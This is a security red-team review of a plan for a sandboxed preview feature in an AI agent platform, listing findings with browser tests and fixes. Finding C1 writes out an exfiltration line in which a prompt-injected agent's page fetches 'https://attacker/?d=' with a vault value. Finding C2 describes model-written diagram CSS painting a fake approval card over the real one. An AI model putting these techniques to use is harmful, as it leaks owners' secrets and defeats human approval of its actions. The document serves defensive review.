# UX-2 plan red team (2026-10-28)

- **Plan:** `docs/plans/2026-10-28-ux-2.md` at `7d088daa` (feat/ux-2). **Spec:** `docs/specs/2026-10-28-ux-2-design.md`. Line numbers below are the plan's unless they say "spec" or name a file.
- **What I ran** (scratch only, now deleted): the plan's own security code copied out of the plan (`target.ts`, `headers.ts`, `fetch-site.ts`, `ownership.ts`) under Node 24 with type stripping. I also ran a browser experiment in the local Playwright image (`mcr.microsoft.com/playwright:v1.63.0-noble`, `--network=none`; Chromium, WebKit and Firefox) and checked the base image (`node:24-bookworm-slim`). No repository file changed, no port in the brief's list was used, and nothing touched pap-vmd, `/run/pap-vm`, `~/.pap` or `~/.pi/agent`.
- **Counts:** 2 Critical · 11 Important · 11 Minor. **Verdict: ready after fixes** (end of file).

---

## Critical

### C1. Q1's default gives a no-network box a zero-click way out through the owner's browser, vault values included
**Plan lines:** 214–218 (Q1), 439–440 (`serviceCsp`), 1903 (Known limits). **Spec:** §3 anti-goal line 40, §4 line 62.

**Scenario.** An agent has `sandbox.network` off and is prompt-injected. Its shell runs `echo "$SOME_VAULT_VALUE" > site/index.html` (ADR 0081: vault values reach the VM shell's environment) and calls `preview_start` (`whenTainted: "run"`). The owner clicks OPEN PREVIEW. The page's own script then runs `fetch("https://attacker/?d=" + document.body.innerText)`, or sets `new Image().src` to the same URL. The service CSP has no `default-src` and no `connect-src`, so the browser sends the request. This takes no click beyond "view". A networked session bypasses its egress allowlist the same way, and the page can also load remote scripts from anywhere.

Today a model's text can only offer a link that the owner has to click. A preview page sends the data by itself once the owner merely looks at it.

The planner reads the anti-goal "a preview that reaches the network its session could not reach" as covering only the service process. The purpose of network off is that data in the box does not leave without the owner's deliberate act, and the default as planned breaks that.

**Evidence.** The CSP strings in the plan (lines 439–440) were read literally: the service CSP has only `sandbox` and `frame-ancestors`, so no fetch directive applies.

**Change.** Build the Q1 recommendation as the default, in T1 and T10 (answer to Q1 at the end of this file). Change the T17 Known limits to name only what stays open: popups and top-level self-navigation (see I11), WebRTC and DNS prefetch. Add a test: a no-network service's page that calls `fetch("http://192.0.2.1/")` gets a CSP violation (unit check of `serviceCsp` output, plus J18 through the I2 seam).

### C2. Rich replies can paint over pap's own UI, approval cards included, from model text
**Plan lines:** 90–91 (Mermaid and Math values), R45 1854 (`dangerouslySetInnerHTML` of KaTeX output, `maxSize: 20`), R48 1870 ("script-src stops any script… img-src any remote image"), T15 tests 1874, model table 1972–1973 (T14 has only a Sonnet review).

**Scenario: Mermaid.** `securityLevel: "strict"` sanitizes labels, but:
- The init directive `%%{init: {"themeCSS": "…"}}%%` can still set `themeCSS`, `themeVariables`, `fontFamily`, `htmlLabels` and `dompurifyConfig`. Mermaid's default `secure` list is only `secure, securityLevel, startOnLoad, maxTextSize, suppressErrorRendering, maxEdges`.
- Mermaid writes `themeCSS` into the `<style>` element of the SVG. DOMPurify's final pass keeps `<style>`, because Mermaid's own styling needs it.
- Even scoped CSS such as `#mermaid-1{position:fixed;inset:0;z-index:2147483647;pointer-events:none}` turns the diagram into a full-viewport overlay in pap's origin.
- HTML labels (flowcharts default to `htmlLabels: true`) keep DOMPurify's default tags inside `foreignObject`, including `form`, `input`, `button` and `a href`.
- `style-src 'unsafe-inline'` and `form-action 'self'` are in the app CSP, so all of this applies.

A model can therefore show "Allow once: ls -la" over the real approval card (`DialogList`, under the transcript) while clicks pass through to the real buttons. Without the untrusted frame, this is the exact situation the anti-goal names.

**Scenario: KaTeX.** The output uses inline `position:relative` boxes. `\raisebox{-15em}{\colorbox{white}{…}}` and `\rule{20em}{20em}`, both within `maxSize: 20`, paint up to about 320 px outside the formula's line, over later content that is not positioned (the next card).

**Evidence.**
- The KaTeX scenario follows from the plan's own options (lines 91, 1854); no CSS containment is planned anywhere.
- The Mermaid scenario rests on Mermaid's documented `secure` default and the structure of `render()`. Mermaid is not in the offline pnpm store, so I could not run it. T15 must reproduce it first (test below).

**Change (T14, T15).**
1. Render a Mermaid diagram as an image, never as DOM: `mermaid.render()` → `URL.createObjectURL(new Blob([svg], {type: "image/svg+xml"}))` → `<img>`. CSS, forms and links stay inert inside the image document, and `img-src` already allows `blob:`. Set `htmlLabels: false` for fidelity in `<img>`. Add `themeCSS`, `themeVariables`, `fontFamily`, `altFontFamily`, `htmlLabels`, `flowchart`, `dompurifyConfig`, `theme`, `darkMode` and `look` to `secure`. Drop `MermaidBlock.tsx` from the `no-inner-html.test.ts` allowlist.
2. Contain every math block and diagram box: a token utility with `contain: paint; overflow: hidden; isolation: isolate`, and `maxSize: 2`.
3. Tests:
   - `a diagram with %%{init:{"themeCSS":"#x{position:fixed}"}}%% and an HTML <form> label leaves no <style>, <form> or foreignObject in pap's DOM`;
   - `a math block carries the containment class`.
4. Put T14 under an Opus review, like T15.

---

## Important

### I1. On plain HTTP to a LAN address (the owner's setup), no browser sends Fetch Metadata, and WebKit sends pap's cookie from the framed preview
**Plan lines:** 58 (Safari floor: "Relied on… Sec-Fetch-Site"), R9 971 ("Cost if wrong: none"), 903–908, Review Focus 208, R51 1884. **Spec:** §4 lines 78–84.

**Evidence (ran).** The setup:
- one Node server for "pap" on port 8001, which sets `pap=secret; SameSite=Strict; HttpOnly` and frames port 8002 with `sandbox="allow-scripts allow-forms allow-popups"`;
- one server for the "preview" on port 8002, which sends `CSP: sandbox …` and makes a no-cors fetch, a CORS fetch with credentials and an `<img>` request to `:8001/probe`;
- the same page also opened top-level.

`http://10.9.9.9` (a non-loopback alias, like `http://192.168.1.182`) against `http://localhost`:

| browser @ host | framed preview → pap | top-level preview → pap |
|---|---|---|
| Chromium @ 10.9.9.9 | no `Sec-Fetch-*`, no cookie | no `Sec-Fetch-*`, no cookie |
| **WebKit @ 10.9.9.9** | **no `Sec-Fetch-*`, cookie `pap=secret` on all three** | no `Sec-Fetch-*`, no cookie |
| Firefox @ 10.9.9.9 | no `Sec-Fetch-*`, no cookie | no `Sec-Fetch-*`, no cookie |
| WebKit @ localhost | `cross-site` and the cookie | `cross-site`, no cookie |
| Chromium and Firefox @ localhost | `cross-site`, no cookie | `cross-site`, no cookie |

On the owner's actual mode (`--host <LAN IP> --insecure-http`), T2's refusal never fires. Safari's framed preview sends pap's session cookie on GETs.

What still holds, by existing layers:
- reads are blocked by CORS, and `/files/raw` and every app answer carry Hono's `Cross-Origin-Resource-Policy: same-origin`;
- POSTs carry `Origin: null`, which the Origin guard refuses;
- the WebSocket gets `Origin: null`, which the WS rule refuses.

What does not hold: any cookie-authenticated GET that has a side effect. I found none today that works without a nonce (`/github/app/new` needs an issued state), but nothing guards future routes. J18 runs on `http://localhost`, which is potentially trustworthy, so it cannot see this.

**Change.**
- Rewrite R9, the T17 docs (`auth.md`, ADR 0088, Known limits) and spec §4's claim: Fetch Metadata exists only on potentially trustworthy origins, and in `--insecure-http` LAN mode the same-site refusal does not apply. Name the layers that still hold.
- Add a route-table invariant to `m14-classes.ts` `ROUTE_CLASS` (or a sibling test): every cookie-authenticated GET route is marked `side-effect-free` or `nonce-bound`, and a new GET route fails the test until it is classified.
- Add a J18 case on a non-loopback origin in WebKit (see I2) that asserts the three guarantees still hold through the remaining layers.
- Optional owner choice: in `--insecure-http` with a non-loopback bind, require `PAP_PREVIEW_ORIGIN` on a different host (cross-site), or start the listener with previews off.

### I2. J18 never puts a page in pap's real preview frame, which is the one context where WebKit sends the cookie
**Plan lines:** T16 1879–1894, R51 1884–1885, Review Focus 208.

- **Case 1** (artifact): the artifact CSP (`default-src 'none'`) blocks the three probes before any pap guard is involved. It proves the CSP, not the refusal.
- **Cases 2 and 3**: the stand-in is opened top-level. I1's table shows that WebKit sends no cookie top-level and does send it from the frame. The context with `allow-forms` and `allow-popups` inside pap's frame is never exercised in either engine.
- **Case 2's oracle**: "`pap.lines()` holds `fetch_site_refused` or `origin_refused` for each attempt" cannot hold. These logs are rate-limited to one line per `via` per 10 s (`origin-refusals.ts`, and T2's `fetch-site-refusals.ts` copies the pattern), so two HTTP attempts give one line.

**Change.**
- Frame the stand-in in pap's real page without any VM seam: start one J18 daemon with `PAP_PREVIEW_ORIGIN` set to the stand-in's origin. The app's `frame-src` then admits it, and `page.evaluate` inserts `<iframe sandbox={PREVIEW_SANDBOX} referrerpolicy=no-referrer src=stand-in>` into the signed-in page.
- Run the three probes there in Chromium and WebKit, and add a WebKit run on a non-loopback alias for I1.
- Take the outcome from Playwright network events (`context.on("response")` gives the real 403/401 status even for opaque responses), not from rate-limited log lines.

### I3. "2 opens waiting per box, the third is 503" breaks ordinary pages
**Plan lines:** 77, R2 709, `limits.ts` 545–546, T1 test 719.

Every relayed request needs a fresh tunnel (no pooling): `tunnel_open` over the guest link, an ownership walk of `/proc` in the guest, a new gateway connection, the hello and the token check. A browser fetches a page's CSS, JS, images and favicon in parallel over up to 6 connections. With only 2 opens in flight, requests 3 to 6 are refused `503 busy` at once, so the owner's example site shows up without its styles or scripts at random. T11's Kata cases are single requests and cannot see this.

**Change.** Add a bounded FIFO wait per box in front of the 2 concurrent opens (for example 32 waiting, each with the 15 s open deadline). Refuse `busy` only when the queue is full; that still never evicts. Test: `12 parallel GETs through a fake two-slot open all succeed in order; the 33rd waiting is busy`.

### I4. The gateway's transport ping kills every tunnel after 15 s
**Plan lines:** T4 `tunnel-frames.ts` doc 1057–1061 ("A frame of another shape closes the tunnel"), R23 1571 ("a malformed frame… ends both"), T6 tests 1575.

`gateway.ts` (lines 228–233) arms `tick` for every accepted connection, so `{type:"ping"}` arrives every `GATEWAY_PING_MS` = 15 s. After `GATEWAY_PING_MISSES` = 3 the gateway closes the connection. `pty.ts:174` answers pings before parsing; the plan's tunnel rules do the opposite: they close the tunnel on the first ping, at 15 s. WebSockets (spec §1 non-goal list keeps them), live reload, SSE and slow downloads all die. The Kata WebSocket echo (1728) is too short to notice.

**Change.** R23: answer `ping` with `pong` before `TunnelFrame` parsing, as `pty.ts` does. Say in `tunnel-frames.ts` that transport frames are not tunnel frames. Test in `tunnels.test.ts` with a fake clock: `a tunnel open for 60 s answers four pings and stays up`.

### I5. The daemon trusts the guest to respect the 1 MiB window
**Plan lines:** R25 1609, T7 1584–1611. **Brief surface:** 6.

`tunnelSocket` pushes and acknowledges received data "except while push returns false". A guest that ignores missing acks keeps sending. Guest root is the VM boundary, and an agent that escapes bwrap is the threat model. Node's `Readable` then buffers without limit behind a slow browser, until the daemon runs out of memory. The gateway meter limits the rate (64 MiB per 10 s per connection), not the total. `remote-pty.ts` has the same pattern, but tunnel volume is far larger and the bearer token lets anyone drive traffic.

**Change.** The receiving side enforces the window: destroy the tunnel when received minus acknowledged exceeds `TUNNEL_WINDOW_BYTES`, plus one frame of tolerance. Test: `a guest that sends 2 MiB without an ack has its tunnel destroyed and nothing buffered past 1 MiB`.

### I6. "Mirroring B2's terminals" brings slot bookkeeping that grows with every request
**Plan lines:** 10, R23 1571, R24 1608, T7 1584.

Terminals are rare; tunnels happen once per HTTP request.
- **Guest:** `pty.ts` keeps `used.add(slot)` forever (line 67). Copied into `tunnels.ts`, a page that polls ten times a second adds about 864 000 entries a day, and the guest's memory is bounded only by the VM.
- **Daemon:** `guest-ptys.ts` keeps given-up slots (`giveUp` sets `used` and never deletes) until the link closes. Every refused or timed-out tunnel open would leak one entry.

**Change.**
- Daemon: delete a slot entry once it is accepted-and-closed or given up. A late hello for a deleted slot is refused `slot`, which is correct.
- Guest: track only open tunnels. Replay protection is the daemon's slot check.
- Test: `10 000 tunnels opened and closed leave 0 slot entries on both sides`.

### I7. `previews.open` and `previews.artifact` results would be saved in receipts in `state.db`
**Plan lines:** 1099–1105 (no `secretResult`), R40 1802 and R50 1872 (both mutations with a command id). **Spec:** §4 line 59 ("tokens in memory only").

`dispatcher.ts` lines 113–117 save the full result of every non-`secretResult` mutation in the receipts table. The capability URL `…/p/<token>/` and the lease would therefore persist in `state.db`, and a backup taken while pap runs would hold live links (≤5 min for a service, ≤1 h for an artifact).

**Change.** Mark `secretResult: true` on `previews.open` and `previews.artifact`. A replayed command then answers `conflict`: the pane and the artifact toggle mint again with a new command id. Add a contracts test: every method whose result schema carries a preview URL or lease is `secretResult`.

### I8. The MQ6 re-check lets an answered `preview_start` run after the session moved to read-only
**Plan lines:** R26 1625, tests 1628. **Brief surface:** 7.

`platformKind` (`tool-kind.ts:147`) classifies every platform tool as category `read`. When a supervised ask is answered after the owner switched the session to read-only, `recheckAnswered` (`pipeline.ts:282`) runs `readOnlyRefusal`, which calls `decide({mode: "read-only", category: "read"})`. That allows reads, so the command runs in a read-only session.

**Change.**
- Make `readOnlyRefusal` (or `platformKind` for `preview_start`) treat it as a command, for example category `edit`, like the sandboxed shell.
- Test: `a supervised preview_start answered Allow once after the session moved to read-only is refused (MQ6)`.
- Optionally, the daemon's `preview.start` handler refuses `forbidden` when the session's own row says read-only (defense in depth, read from the daemon's records).

### I9. Token caps refuse rather than evict, and the plan mints on every view, so the owner locks themself out
**Plan lines:** 76, `tokens.ts` 743–755, R40 1802 (a mint at every mount), R50 1872 ("once per toggle-on").

An artifact token lives 1 h, with 32 per user. Every PREVIEW toggle, and every remount of a message row, mints a new one. An hour of iterating on HTML replies reaches 32, and then `limit_reached` lasts up to an hour. A service pane mints at every mount: a phone switching Chat/Preview, splits, other devices. Eight members can fill the global 256.

**Change.**
- `mintArtifact` returns the live token for the same `(ownerId, sessionId, entryId, fenceIndex)`.
- Add `previews.close {lease}` on pane unmount, which revokes the token, so the cap counts live panes rather than mints.
- Tests: `the 40th toggle of one fence reuses its token`; `an unmounted pane frees its place`.

### I10. Response cleaning is a blocklist and already misses headers that change browser state
**Plan lines:** 338–376 (`DROPPED_RESPONSE`), test 717, `upgradeHead` 503–518; the relay's answer to a non-101 upgrade is not specified (674–705 give only the dispatch).

**Evidence (ran).** `cleanResponseHeaders` from the plan, fed a service answer, keeps:
- `www-authenticate`: a native credentials prompt over pap's tab;
- `sec-session-registration`: Chrome's device-bound sessions, processed by the network stack whatever the sandbox;
- `set-login`, `accept-ch`, `critical-ch`, `speculation-rules`, `activate-storage-access`, `origin-agent-cluster`, `permissions-policy`, `cross-origin-opener-policy`, `link`;
- by inspection, also `access-control-allow-private-network`.

Like `Set-Cookie` and `Clear-Site-Data` (which the plan drops), network-layer headers act on the host (every port) whatever the CSP sandbox. The list keeps growing.

Separately, when a service answers an upgrade with a normal response (`200` or `302` with `Set-Cookie`), nothing says the relay must not write it raw onto the socket.

The rest held up: 300 000 fuzzed `Location` values gave 115 547 kept, none outside `/p/<token>/` and none with a control character. The target parser refused `/P/…` and accepted only raw tokens.

**Change.**
- Replace the response blocklist with an allowlist: `content-type`, `content-length`, `content-encoding`, `content-language`, `content-disposition`, `content-range`, `accept-ranges`, `etag`, `last-modified`, `vary`, `date`, `access-control-allow-methods|headers|expose-headers|max-age`, the rewritten `location`, then pap's own headers.
- Specify that a non-101 answer to an upgrade gets `rawRefusal(502)`, with a test.
- Turn a `401` that carries `WWW-Authenticate` into a plain 401 without the header.

### I11. OPEN IN A NEW TAB and `allow-popups` show agent content top-level, with no UNTRUSTED label, at pap's address plus one port
**Plan lines:** 93, R39 1801 (`window.open(url, "_blank", …)`), R4 711, which refuses top-level artifacts for this very reason. **Spec:** §3 anti-goal line 43, §7 lines 140–141.

In a new tab (or a popup the page opens on a click), the page fills the window without pap's frame, at `http://host:7778` against pap's `http://host:7777`. It can render pap's login and send typed text anywhere, or navigate itself away (no parent `frame-src` exists there, so even C1's CSP cannot stop self-navigation). Passkeys are safe only because the CSP sandbox makes the origin opaque.

**Change.**
- OPEN IN A NEW TAB opens a pap-origin route (for example `/preview#<box>/<name>`) that renders `SandboxedFrame` full-window, with its label and the parent `frame-src`.
- Owner decision: drop `allow-popups` from both sandbox sets, or at least for no-network services.
- Change the docs to say what a popup can do.

---

## Minor

- **M1. The network comes from the agent's current setting, not from the session's own shell.** R28 1666 and 1660–1661 read the agent registry at call time. `agents-vm.md` says "The shell's network follows `sandbox.network`, read when its session opens". When the owner turns network on while a thread runs, the shell stays off but the service gets network, against spec §5 "exactly the network its session's shell has". Fix: take `network` from the session's launch policy (`rules.sandbox.network` of the row's start record). Test: `network turned on after the thread opened: the service still starts with network false`.
- **M2. The 400-line cap breaks in T7.** `apps/daemon/src/modules/agent-vm/gateway.hello.test.ts` is 395 lines (`wc -l`), and T7 adds rows to it (1585, 1611); the size table (26–50) omits it. Put the tunnel hello cases in a new `gateway.tunnel.test.ts`. `box-control.test.ts` (364) is close too, see M10.
- **M3. The Kata journey proves the bwrap path only after the merge.** R37 1722, J2 1918–1924. The capabilities, read-only root, network off and namespace entry are first proven after squash-merge. Write a failure policy into J2: a failure of any security case blocks the push and turns previews off (or reverts), not only "a follow-up". Separately, add `util-linux` to `BASE_PACKAGES` in T6 at no extra cost: the base rebuilds anyway, since the bundle digest changes (R14). Evidence (ran): `node:24-bookworm-slim` has `/usr/bin/nsenter` from `util-linux`, which is Essential. The pinned `node:24.14.1-trixie-slim` could not be checked offline.
- **M4. START PREVIEW runs a command the owner never sees.** R43 1818 and copy line 121 show only the port. The command comes from `.pi/project.yaml`, which a cloned repository or the model can write, and it runs without the shell's supervised review. Show the clipped command as React text beside the button.
- **M5. A preview loads without a click on restore and on a model restart.** R41 1803 re-opens on workspace restore. R40 1802 re-opens automatically on `not_found`, so the model can swap new content into an open pane by restarting the same name. Decision 5 says the owner opens it with a click. Fix: re-open only for the same service id; otherwise show OPEN PREVIEW.
- **M6. The eval probe cannot judge Mermaid.** R49 1871. The probe imports a chunk in Node at load, while Mermaid's risk is at render. J18 renders one flowchart (1891). Render several diagram types in J18 and assert no `securitypolicyviolation` event. Moot if C2's `<img>` route is taken.
- **M7. Production-path proofs are missing for three guards:**
  - `preview_start` in read-only mode through a real worker (T8 is unit-only, 1628);
  - the `/ws` same-site refusal on the real daemon (T2 tests it only in the `ws-server.credentials` harness, 977);
  - `revokeOwner` on user delete (T10 tests only disable, 1710).

  Add one int case each.
- **M8. A pid can be reused between check and use.** `nsenterCommand` (1438–1446) enters `/proc/<nsPid>/ns/net` by pid, and the stop ladder (R19 1382) signals the tree by pid. Open the namespace fd and re-check the pid's start time before use (or use a pidfd), and signal through the outer bwrap only.
- **M9. Copy understates what breaks.** Copy line 118 and Known limits 1903 name cookie logins only. `Authorization` is dropped too, so header-token logins also fail.
- **M10. A behaviour change has no test.** T10 changes `box-control.ts` `readWanted` (1684: record the preview before the packages check) and names no test for it. Add one in a new file: `box-control.test.ts` is at 364.
- **M11. The model table.** T14 (KaTeX through `dangerouslySetInnerHTML`) gets only a Sonnet review (1972). Make it Opus with C2 (the owner approves model upgrades).

Also checked, no finding:
- Module boundaries: the listener is kernel and reaches tokens through its `grantOf` port; pi-host imports `@pap/contracts/pi-host` only.
- Task order: the untrusted origin lands first, and the approval (T8) lands before the handlers (T9).
- The protocol-3 pins: the 3 tests, `image-policy` and `kata-images` follow the constant.
- The token store's bounds and hashing.
- `checkOwnership` on this host's real `/proc` (ran): `SO_REUSEPORT` shared with a stranger → `port_not_owned`; after the stranger leaves → owned; IPv6-only `::1` → owned via `::1`; a listener whose parent exited → `gone`.
- The `Sec-Fetch-Site` decision table (ran, 14 rows): the GitHub callbacks pass only for their two paths, `/finish` is refused, an iframe destination is refused, an encoded `/%66iles/raw` is refused.

---

## Verdict: **ready after fixes**

C1 and C2 are plan changes of a few hours each, with no architecture change: the CSP in T1/T10, and `<img>` plus containment in T14/T15. I1 through I11 are local rulings and tests. Nothing calls for re-planning the lot.

## Answer to Q1

**Restrict, as the planner recommends, by default and not as an option.** Without it, a session without network can get data out through the owner's browser the moment the preview opens (C1), and a networked session bypasses its host list.

Corrections to the recommended policy:
- **Name the preview origin explicitly, never `'self'`.** In a sandboxed, opaque-origin document, browsers do not agree on what `'self'` matches.
- **Add `ws://` or `wss://<preview host:port>` to `connect-src`.** CSP3 does not let an `http:` source match `ws:`, so WebSocket apps break without it.
- **Spell out `form-action`, `base-uri`, `frame-src`/`child-src` and `worker-src 'self' blob:`-equivalents.** `form-action` and `base-uri` never fall back to `default-src`.
- **For a networked session, map the hosts from the daemon's records at mint time** (the owner's list plus the project's or agent's own; IPv6 literals left out) and freeze them in the grant. Never take them from the worker.
- **For a session without network, allow the preview origin plus `data:` and `blob:` only.**

What stays open even then:
- popups and top-level self-navigation (I11);
- WebRTC and DNS prefetch.

The docs should name these. For no-network services, consider dropping `allow-popups` and opening the new tab through the pap wrapper.

**Cost:** about 1 to 2 h across T1, T10 and T17. A page that pulls a CDN asset its session may not reach renders without it, which is consistent with what the service itself could fetch.
